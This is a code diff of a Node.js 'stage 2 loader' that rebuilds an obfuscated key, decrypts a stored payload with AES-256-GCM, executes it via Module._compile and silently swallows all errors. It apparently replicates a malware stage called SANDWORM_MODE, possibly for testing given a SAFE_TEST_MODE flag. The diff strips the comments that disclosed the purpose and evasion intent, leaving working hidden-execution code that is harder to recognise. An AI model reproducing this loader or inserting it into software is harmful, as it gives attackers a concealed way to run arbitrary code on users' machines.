@@ -1,13 +1,9 @@
-// Stage 2 loader — decrypts and executes the encrypted payload
-// Replicates: SANDWORM_MODE time-gated stage 2 with encrypted payload
-
 const SAFE_TEST_MODE = true;
 
 const crypto = require("crypto");
 const fs = require("fs");
 const path = require("path");
 
-// Obfuscated key (split across variables to evade simple grep)
 const _k1 = "s4ndw0rm";
 const _k2 = "_k3y_";
 const _k3 = "2024";
@@ -27,22 +23,19 @@ function loadStage2() {
     const authTag = Buffer.from(parts[1], "hex");
     const encrypted = parts[2];
 
-    // Derive key from obfuscated material
     const key = crypto.createHash("sha256").update(KEY_MATERIAL).digest();
 
-    // AES-256-GCM decryption
     const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
     decipher.setAuthTag(authTag);
 
     let decrypted = decipher.update(encrypted, "hex", "utf8");
     decrypted += decipher.final("utf8");
 
-    // Execute the decrypted stage 2 code
     const Module = require("module");
     const m = new Module();
     m._compile(decrypted, "stage2.js");
   } catch (e) {
-    // Decryption failed or file not found — silent
+
   }
 }
 
